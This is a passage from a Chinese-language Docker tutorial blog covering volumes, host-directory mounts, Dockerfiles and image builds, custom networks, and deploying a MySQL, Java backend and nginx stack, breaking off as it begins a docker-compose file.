src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.28.19.png" style="zoom:50%;"><p>如图所示，通过创建数据卷可以实现宿主机目录和容器目录的同步读写操作。</p><h2 id="5-2-数据卷相关的命令"><a href="#5-2-数据卷相关的命令" class="headerlink" title="5.2 数据卷相关的命令"></a>5.2 数据卷相关的命令</h2><table><thead><tr><th>命令</th><th>说明</th><th>文档地址</th></tr></thead><tbody><tr><td>docker volume create</td><td>创建数据卷</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_create/">docker   volume create</a></td></tr><tr><td>docker volume ls</td><td>查看所有数据卷</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_ls/">docker   volume ls</a></td></tr><tr><td>docker volume rm</td><td>删除指定数据卷</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_prune/">docker   volume rm</a></td></tr><tr><td>docker volume inspect</td><td>查看某个数据卷的详情</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_inspect/">docker   volume inspect</a></td></tr><tr><td>docker volume prune</td><td>清除数据卷</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_prune/">docker   volume prune</a></td></tr></tbody></table><h2 id="5-3-案例一（卷名挂载）"><a href="#5-3-案例一（卷名挂载）" class="headerlink" title="5.3 案例一（卷名挂载）"></a>5.3 案例一（卷名挂载）</h2><h3 id="5-3-1-案例描述"><a href="#5-3-1-案例描述" class="headerlink" title="5.3.1 案例描述"></a>5.3.1 案例描述</h3><ul><li>创建Nginx容器，修改nginx容器内的html目录下的index.html文件，查看变化</li></ul><blockquote><p>尝试进入容器进行修改，发现vi命令不存在。这是因为镜像一般都是最小化安装，并没有提前预置各种工具。</p></blockquote><ul><li>将静态资源部署到nginx的html目录</li></ul><blockquote><p>想从宿主机拷贝资源到容器中该怎么办？</p></blockquote><h3 id="5-3-2-案例解决"><a href="#5-3-2-案例解决" class="headerlink" title="5.3.2 案例解决"></a>5.3.2 案例解决</h3><p>在执行docker run命令时，使用 <strong>-v</strong>  数据卷:容器内目录可以完成数据卷挂载</p><p>当创建容器时，如果挂载了数据卷且数据卷不存在，会自动创建数据卷</p><p>下图为案例5.1的解决，在docker run 创建容器的时候，-v指定数据卷。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.49.08.png" alt="截屏2024-12-13 13.49.08"></p><blockquote><p>回顾：</p><p>什么是数据卷？</p><ul><li>数据卷是一个虚拟目录，它将宿主机目录映射到容器内目录，方便我们操作容器内文件，或者方便迁移容器产生的数据。</li></ul><p>如何挂载数据卷？</p><ul><li>在创建容器时，利用 -v 数据卷名：容器内目录完成挂载</li><li>容器创建时，如果发现挂载的数据卷不存在时，会自动创建</li></ul><p>数据卷的常见命令有哪些？</p><ul><li>docker volume ls: 查看数据卷</li><li>docker volume rm: 删除数据卷。</li><li>docker volume inspect: 查看数据卷详情。</li><li>docker volume prune:  删除未使用的数据卷。</li></ul></blockquote><h2 id="5-4-案例二（宿主机目录挂载）"><a href="#5-4-案例二（宿主机目录挂载）" class="headerlink" title="5.4 案例二（宿主机目录挂载）"></a>5.4 案例二（宿主机目录挂载）</h2><h3 id="5-4-1-案例描述"><a href="#5-4-1-案例描述" class="headerlink" title="5.4.1 案例描述"></a>5.4.1 案例描述</h3><p>需求：</p><ul><li><p>查看mysql容器，判断是否有数据卷挂载</p></li><li><p>基于宿主机目录实现MySQL数据目录、配置文件、初始化脚本的挂载（查阅官方镜像文档）</p></li></ul><p>①挂载/root/mysql/data到容器内的/var/lib/mysql目录</p><p>②挂载/root/mysql/init到容器内的/docker-entrypoint-initdb.d目录，提前准备的SQL脚本</p><p>③挂载/root/mysql/conf到容器内的/etc/mysql/conf.d目录，提前准备的配置文件。</p><h3 id="5-4-2-案例解决"><a href="#5-4-2-案例解决" class="headerlink" title="5.4.2 案例解决"></a>5.4.2 案例解决</h3><p>在执行docker run命令时，使用 <strong>-v</strong> <strong>本地目录</strong> <strong>:</strong> <strong>容器内目录</strong> 可以完成本地目录挂载</p><p>本地目录必须以“**/<strong>”或 “</strong>./**” 开头，如果直接以名称开头，会被识别为数据卷而非本地目录</p><ul><li><p>-v mysql:/var/lib/mysql 会被识别为一个数据卷叫mysql</p></li><li><p>-v ./mysql:/var/lib/mysql 会被识别为当前目录下的mysql目录</p></li></ul><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2016.34.22.png" alt="截屏2024-12-13 16.34.22"></p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2016.36.13.png" style="zoom:50%;"><p>测试数据成功生成，说明我们挂载的本地init目录中的sql脚本被成功执行。</p><h1 id="六、自定义镜像"><a href="#六、自定义镜像" class="headerlink" title="六、自定义镜像"></a>六、自定义镜像</h1><h2 id="6-1-镜像结构"><a href="#6-1-镜像结构" class="headerlink" title="6.1 镜像结构"></a>6.1 镜像结构</h2><p>镜像就是包含了程序运行的系统函数库、应用程序、运行配置等文件的文件包。构建镜像的过程其实就是把上述文件打包的过程。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.24.35.png" style="zoom:40%;"><p>镜像结构：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.26.13.png" style="zoom:35%;"><h2 id="6-2-Dockerfile"><a href="#6-2-Dockerfile" class="headerlink" title="6.2 Dockerfile"></a>6.2 Dockerfile</h2><p><strong>Dockerfile</strong>就是一个文本文件，其中包含一个个的<strong>指令</strong>(Instruction)，用指令来说明要执行什么操作来构建镜像。将来Docker可以根据Dockerfile帮我们构建镜像。常见指令如下：</p><table><thead><tr><th><strong>指令</strong></th><th><strong>说明</strong></th><th><strong>示例</strong></th></tr></thead><tbody><tr><td>FROM</td><td>指定基础镜像</td><td>FROM centos:6</td></tr><tr><td>ENV</td><td>设置环境变量，可在后面指令使用</td><td>ENV key value</td></tr><tr><td>COPY</td><td>拷贝本地文件到镜像的指定目录</td><td>COPY ./jre11.tar.gz /tmp</td></tr><tr><td>RUN</td><td>执行Linux的shell命令，一般是安装过程的命令</td><td>RUN tar -zxvf /tmp/jre11.tar.gz  &amp;&amp; EXPORTS  path=/tmp/jre11:$path</td></tr><tr><td>EXPOSE</td><td>指定容器运行时监听的端口，是给镜像使用者看的</td><td>EXPOSE 8080</td></tr><tr><td>ENTRYPOINT</td><td>镜像中应用的启动命令，容器运行时调用</td><td>ENTRYPOINT java -jar xx.jar</td></tr></tbody></table><p>更新详细语法说明，请参考官网文档： <a href="https://docs.docker.com/engine/reference/builder">https://docs.docker.com/engine/reference/builder</a></p><ul><li>示例：</li></ul><p>我们可以基于Ubuntu基础镜像，利用Dockerfile描述镜像结构。</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token comment"># 指定基础镜像</span><span class="token instruction"><span class="token keyword">FROM</span> ubuntu:16.04</span><span class="token comment"># 配置环境变量，JDK的安装目录、容器内时区</span><span class="token instruction"><span class="token keyword">ENV</span> JAVA_DIR=/usr/local</span><span class="token comment"># 拷贝jdk和java项目的包</span><span class="token instruction"><span class="token keyword">COPY</span> ./jdk8.tar.gz <span class="token variable">$JAVA_DIR</span>/</span><span class="token instruction"><span class="token keyword">COPY</span> ./docker-demo.jar /tmp/app.jar</span><span class="token comment"># 安装JDK</span><span class="token instruction"><span class="token keyword">RUN</span> cd <span class="token variable">$JAVA_DIR</span> \ &amp;&amp; tar -xf ./jdk8.tar.gz \ &amp;&amp; mv ./jdk1.8.0_144 ./java8</span><span class="token comment"># 配置环境变量</span><span class="token instruction"><span class="token keyword">ENV</span> JAVA_HOME=<span class="token variable">$JAVA_DIR</span>/java8</span><span class="token instruction"><span class="token keyword">ENV</span> PATH=<span class="token variable">$PATH</span>:<span class="token variable">$JAVA_HOME</span>/bin</span><span class="token comment"># 入口，java项目的启动命令</span><span class="token instruction"><span class="token keyword">ENTRYPOINT</span> [<span class="token string">"java"</span>, <span class="token string">"-jar"</span>, <span class="token string">"/app.jar"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以基于Ubuntu基础镜像，利用Dockerfile描述镜像结构,也可以直接基于JDK为基础镜像，省略前面的步骤：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.31.26.png" style="zoom:40%;"><h2 id="6-3-构建镜像"><a href="#6-3-构建镜像" class="headerlink" title="6.3 构建镜像"></a>6.3 构建镜像</h2><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token comment"># 基础镜像</span><span class="token instruction"><span class="token keyword">FROM</span> openjdk:11.0-jre-buster</span><span class="token comment"># 拷贝jar包</span><span class="token instruction"><span class="token keyword">COPY</span> docker-demo.jar /app.jar</span><span class="token comment"># 入口</span><span class="token instruction"><span class="token keyword">ENTRYPOINT</span> [<span class="token string">"java"</span>, <span class="token string">"-jar"</span>, <span class="token string">"/app.jar"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当编写好了Dockerfile，可以利用下面命令来构建镜像:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> build <span class="token parameter variable">-t</span> myImage:1.0 <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>-t</strong> ：是给镜像起名，格式依然是repository:tag的格式，不指定tag时，默认为latest</p><p> <strong>.</strong> ：是指定Dockerfile所在目录，如果就在当前目录，则指定为”.”</p></blockquote><h2 id="6-3-构建镜像并运行（EX）"><a href="#6-3-构建镜像并运行（EX）" class="headerlink" title="6.3 构建镜像并运行（EX）"></a>6.3 构建镜像并运行（EX）</h2><h3 id="6-3-1-构建镜像"><a href="#6-3-1-构建镜像" class="headerlink" title="6.3.1 构建镜像"></a>6.3.1 构建镜像</h3><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.45.58.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.48.56.png" alt="截屏2024-12-17 10.48.56" style="zoom:50%;"><blockquote><p>注意镜像名称不能有大写字母。</p></blockquote><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.59.38.png" style="zoom:50%;"><p>获取基础镜像时报错。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.59.19.png" style="zoom:50%;"><p>单独拉取一下openjdk:11.0-jre-buster镜像。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.00.43.png" alt="截屏2024-12-17 11.00.43" style="zoom:50%;"><p>然后重新运行构建镜像的命令。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.01.17.png" alt="截屏2024-12-17 11.01.17"></p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.01.37.png" alt="截屏2024-12-17 11.01.37" style="zoom:50%;"><h3 id="6-3-2-运行容器"><a href="#6-3-2-运行容器" class="headerlink" title="6.3.2 运行容器"></a>6.3.2 运行容器</h3><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.03.22.png" alt="截屏2024-12-17 11.03.22"></p><h3 id="6-3-3-访问测试"><a href="#6-3-3-访问测试" class="headerlink" title="6.3.3 访问测试"></a>6.3.3 访问测试</h3><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.06.03.png" alt="截屏2024-12-17 11.06.03" style="zoom:50%;"><p>成功访问到容器内的应用。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>镜像的结构是怎样的？</li></ul><p>镜像中包含了应用程序所需要的运行环境、函数库、配置、以及应用本身等各种文件，这些文件分层打包而成。</p><ul><li>Dockerfile是做什么的？</li></ul><p>Dockerfile就是利用固定的指令来描述镜像的结构和构建过程，这样Docker才可以依次来构建镜像。</p><ul><li>构建镜像的命令是什么？</li></ul><p>docker build -t 镜像名 Dockerfile目录</p><h1 id="七、Docker网络"><a href="#七、Docker网络" class="headerlink" title="七、Docker网络"></a>七、Docker网络</h1><p>默认情况下，所有容器都是以bridge方式连接到Docker的一个虚拟网桥上：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.13.28.png" style="zoom:40%;"><p>docker inspect 来查看容器的网络配置。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.17.45.png" style="zoom:40%;"><p>网络，加入自定义网络的容器可以通过容器名互相访问，Docker的网络操作命令如下：</p><table><thead><tr><th><strong>命令</strong></th><th><strong>说明</strong></th><th><strong>文档地址</strong></th></tr></thead><tbody><tr><td>docker network create</td><td>创建一个网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_create/">docker   network create</a></td></tr><tr><td>docker network ls</td><td>查看所有网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_ls/">docker   network ls</a></td></tr><tr><td>docker network rm</td><td>删除指定网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_rm/">docker   network rm</a></td></tr><tr><td>docker network prune</td><td>清除未使用的网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_prune/">docker   network prune</a></td></tr><tr><td>docker network connect</td><td>使指定容器连接加入某网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_connect/">docker   network connect</a></td></tr><tr><td>docker network disconnect</td><td>使指定容器连接离开某网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_disconnect/">docker   network disconnect</a></td></tr><tr><td>docker network inspect</td><td>查看网络详细信息</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_inspect/">docker   network inspect</a></td></tr></tbody></table><ul><li>可以在docker  run 的时候通过 –networks 指定网络名。</li></ul><h1 id="八、分容器项目部署"><a href="#八、分容器项目部署" class="headerlink" title="八、分容器项目部署"></a>八、分容器项目部署</h1><p>创建网络：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># docker network create heima</span>9a85558bc3ab76e21390a914afb454051467c183fa972c5e0782efcdab286538<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>后续创建的容器使用–networks heima指定网络名。</p><h2 id="8-1-部署mysql数据库容器"><a href="#8-1-部署mysql数据库容器" class="headerlink" title="8.1 部署mysql数据库容器"></a>8.1 部署mysql数据库容器</h2><ul><li>注意保持java后端项目数据库的配置和mysql容器本身配置的连通性。</li></ul><p>mysql数据库容器的容器名mysql，密码123。只有这样，在网络连通的前提下，才能保证java后端应用能够成功访问到mysql容器。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.39.26.png" alt="截屏2024-12-18 09.39.26" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--name</span> mysql <span class="token parameter variable">-p</span> <span class="token number">3306</span>:3306 <span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">123</span> <span class="token parameter variable">-v</span> /root/mysql/data:/var/lib/mysql <span class="token parameter variable">-v</span> /root/mysql/conf:/etc/mysql/conf.d <span class="token parameter variable">-v</span> /root/mysql/init:/docker-entrypoint-initdb.d <span class="token parameter variable">--network</span> heima mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8-2-部署Java后端应用容器"><a href="#8-2-部署Java后端应用容器" class="headerlink" title="8.2 部署Java后端应用容器"></a>8.2 部署Java后端应用容器</h2><ul><li>注意保持java后端项目数据库的配置和mysql容器本身配置的连通性。</li></ul><p>用idea打开项目，通过maven把需要的库都安装一下，然后打包成jar包（注意跳过单元测试）。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.56.53.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.57.30.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.59.50.png" style="zoom:50%;"><p>dockerfile:</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token comment"># 基础镜像</span><span class="token instruction"><span class="token keyword">FROM</span> openjdk:11.0-jre-buster</span><span class="token comment"># 设定时区</span><span class="token instruction"><span class="token keyword">ENV</span> TZ=Asia/Shanghai</span><span class="token instruction"><span class="token keyword">RUN</span> ln -snf /usr/share/zoneinfo/<span class="token variable">$TZ</span> /etc/localtime &amp;&amp; echo <span class="token variable">$TZ</span> &gt; /etc/timezone</span><span class="token comment"># 拷贝jar包</span><span class="token instruction"><span class="token keyword">COPY</span> hm-service.jar /app.jar</span><span class="token comment"># 入口</span><span class="token instruction"><span class="token keyword">ENTRYPOINT</span> [<span class="token string">"java"</span>, <span class="token string">"-jar"</span>, <span class="token string">"/app.jar"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传到目标机器中，然后制作镜像。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.03.05.png" alt="截屏2024-12-18 10.03.05" style="zoom:50%;"><p>制作镜像：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> build <span class="token parameter variable">-t</span> hmall <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.04.36.png" alt="截屏2024-12-18 10.04.36"></p><p>启动容器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost hm-service<span class="token punctuation">]</span><span class="token comment"># docker run -d --name hmall -p 8080:8080 --network heima hmall</span>e5c900979c64be115676c294396e7ebc4deafdcba44c91ac49cc172cddaceed9<span class="token punctuation">[</span>root@localhost hm-service<span class="token punctuation">]</span><span class="token comment"># dps</span>CONTAINER ID    IMAGE          PORTS                                                  STATUS          NAMESe5c900979c64    hmall          <span class="token number">0.0</span>.0.0:8080-<span class="token operator">&gt;</span><span class="token number">8080</span>/tcp, :::8080-<span class="token operator">&gt;</span><span class="token number">8080</span>/tcp              Up <span class="token number">2</span> seconds    hmalla26885a896d6    mysql          <span class="token number">0.0</span>.0.0:3306-<span class="token operator">&gt;</span><span class="token number">3306</span>/tcp, :::3306-<span class="token operator">&gt;</span><span class="token number">3306</span>/tcp, <span class="token number">33060</span>/tcp   Up <span class="token number">16</span> minutes   mysql1266a9029269    nginx:latest   <span class="token number">0.0</span>.0.0:8000-<span class="token operator">&gt;</span><span class="token number">80</span>/tcp, :::8000-<span class="token operator">&gt;</span><span class="token number">80</span>/tcp                  Up <span class="token number">23</span> hours     nginxOnCentOS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>docker logs -f hmall 查看日志。</p><p>访问测试：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.09.13.png" style="zoom:50%;"><p>访问<a href="http://192.168.155.34:8080/search/list?pageNo=1&amp;pageSize=5">http://192.168.155.34:8080/search/list?pageNo=1&amp;pageSize=5</a> 接口报错：</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.11.46.png" alt="截屏2024-12-18 10.11.46"></p><p>进入hmall容器ping mysql容器，可以连通。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.13.10.png" style="zoom:33%;"><p>但是mysql容器中没有ping、ipaddr之类的命令。</p><p>网络结构：</p><p>​     虚拟网卡：172.18.0.1 </p><p>​     mysql：172.18.0.2</p><p>​     hmall：172.18.0.3</p><p>登入mysql容器，执行mysql登录命令：mysq -uroot -p 发现密码是123.com才能登录。但是之前创建数据库的时候明明使用-e参数配置的密码是123呀，可能是挂在时没有清空宿主机data目录（目录里面观察到有一些鉴权的组件）的原因。</p><p>清空data目录之后，重新安装mysql：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost hm-service<span class="token punctuation">]</span><span class="token comment"># docker run -d --name hmall -p 8080:8080 --network heima hmall</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入容器用123的密码成功登录。</p><p>继续访问测试页面，成功获取到后台的数据。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.39.43.png" alt="截屏2024-12-18 10.39.43"></p><p>至此，后端应用容器和数据库容器成功部署。</p><h2 id="8-3-部署前端nginx容器"><a href="#8-3-部署前端nginx容器" class="headerlink" title="8.3 部署前端nginx容器"></a>8.3 部署前端nginx容器</h2><p>创建一个新的nginx容器，将提供的nginx.conf、html目录与容器挂载。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost nginx<span class="token punctuation">]</span><span class="token comment"># docker run -d --name nginx -p 18080:18080 -p 18081:18081 --network heima -v /root/nginx/html/:/usr/share/nginx/html -v /root/nginx/nginx.conf:/etc/nginx/nginx.conf nginx</span>19eeda1700ee6815e1b4b92a8dc0ba7ffbf6c9085fdb8a18f0ce9404ee97bf3d<span class="token punctuation">[</span>root@localhost nginx<span class="token punctuation">]</span><span class="token comment"># dps</span>CONTAINER ID    IMAGE    PORTS                                                                           STATUS          NAMES19eeda1700ee    nginx    <span class="token number">80</span>/tcp, <span class="token number">0.0</span>.0.0:18080-18081-<span class="token operator">&gt;</span><span class="token number">18080</span>-18081/tcp, :::18080-18081-<span class="token operator">&gt;</span><span class="token number">18080</span>-18081/tcp   Up <span class="token number">1</span> second     nginx25761d94c3db    mysql    <span class="token number">0.0</span>.0.0:3306-<span class="token operator">&gt;</span><span class="token number">3306</span>/tcp, :::3306-<span class="token operator">&gt;</span><span class="token number">3306</span>/tcp, <span class="token number">33060</span>/tcp                            Up <span class="token number">28</span> minutes   mysqle5c900979c64    hmall    <span class="token number">0.0</span>.0.0:8080-<span class="token operator">&gt;</span><span class="token number">8080</span>/tcp, :::8080-<span class="token operator">&gt;</span><span class="token number">8080</span>/tcp                                       Up <span class="token number">56</span> minutes   hmall<span class="token punctuation">[</span>root@localhost nginx<span class="token punctuation">]</span><span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nginx配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">worker_processes  <span class="token number">1</span><span class="token punctuation">;</span>events <span class="token punctuation">{</span>    worker_connections  <span class="token number">1024</span><span class="token punctuation">;</span><span class="token punctuation">}</span>http <span class="token punctuation">{</span>    include       mime.types<span class="token punctuation">;</span>    default_type  application/json<span class="token punctuation">;</span>    sendfile        on<span class="token punctuation">;</span>        keepalive_timeout  <span class="token number">65</span><span class="token punctuation">;</span>    server <span class="token punctuation">{</span>        listen       <span class="token number">18080</span><span class="token punctuation">;</span>        <span class="token comment"># 指定前端项目所在的位置</span>        location / <span class="token punctuation">{</span>            root /usr/share/nginx/html/hmall-portal<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        error_page   <span class="token number">500</span> <span class="token number">502</span> <span class="token number">503</span> <span class="token number">504</span>  /50x.html<span class="token punctuation">;</span>        location <span class="token operator">=</span> /50x.html <span class="token punctuation">{</span>            root   html<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        location /api <span class="token punctuation">{</span>            rewrite /api/<span class="token punctuation">(</span>.*<span class="token punctuation">)</span>  /<span class="token variable">$1</span> <span class="token builtin class-name">break</span><span class="token punctuation">;</span>            proxy_pass http://hmall:8080<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    server <span class="token punctuation">{</span>        listen       <span class="token number">18081</span><span class="token punctuation">;</span>        <span class="token comment"># 指定前端项目所在的位置</span>        location / <span class="token punctuation">{</span>            root /usr/share/nginx/html/hmall-admin<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        error_page   <span class="token number">500</span> <span class="token number">502</span> <span class="token number">503</span> <span class="token number">504</span>  /50x.html<span class="token punctuation">;</span>        location <span class="token operator">=</span> /50x.html <span class="token punctuation">{</span>            root   html<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        location /api <span class="token punctuation">{</span>            rewrite /api/<span class="token punctuation">(</span>.*<span class="token punctuation">)</span>  /<span class="token variable">$1</span> <span class="token builtin class-name">break</span><span class="token punctuation">;</span>            proxy_pass http://hmall:8080<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-4-测试访问"><a href="#8-4-测试访问" class="headerlink" title="8.4 测试访问"></a>8.4 测试访问</h2><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2011.06.33.png" style="zoom:50%;"><p>大功告成🎉。</p><h1 id="九、DockerCompose"><a href="#九、DockerCompose" class="headerlink" title="九、DockerCompose"></a>九、DockerCompose</h1><p>Docker Compose通过一个单独的<strong>docker-compose.yml</strong> 模板文件（YAML 格式）来定义一组相关联的应用容器，帮助我们实现多个相互关联的Docker容器的快速部署。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2017.57.59.png" style="zoom:50%;"><p>docker run和DockerCompose具有一定的对应关系。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2017.59.45.png" style="zoom:50%;"><p><strong>docker compose</strong>的命令格式如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> compose <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> <span class="token punctuation">[</span>COMMAND<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th><strong>类型</strong></th><th><strong>参数或指令</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Options</td><td>-f</td><td>指定compose文件的路径和名称</td></tr><tr><td>Options</td><td>-p</td><td>指定project名称</td></tr><tr><td>Commands</td><td>up</td><td>创建并启动所有service容器</td></tr><tr><td>Commands</td><td>down</td><td>停止并移除所有容器、网络</td></tr><tr><td>Commands</td><td>ps</td><td>列出所有启动的容器</td></tr><tr><td>Commands</td><td>logs</td><td>查看指定容器的日志</td></tr><tr><td>Commands</td><td>stop</td><td>停止容器</td></tr><tr><td>Commands</td><td>start</td><td>启动容器</td></tr><tr><td>Commands</td><td>restart</td><td>重启容器</td></tr><tr><td>Commands</td><td>top</td><td>查看运行的进程</td></tr><tr><td>Commands</td><td>exec</td><td>在指定的运行中容器中执行命令</td></tr></tbody></table><p>通过dockerCompose部署应用的yml文件：docker-compose.yml</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">"3.8"</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">mysql</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> mysql    <span class="token key atrule">ports</span><span class="token 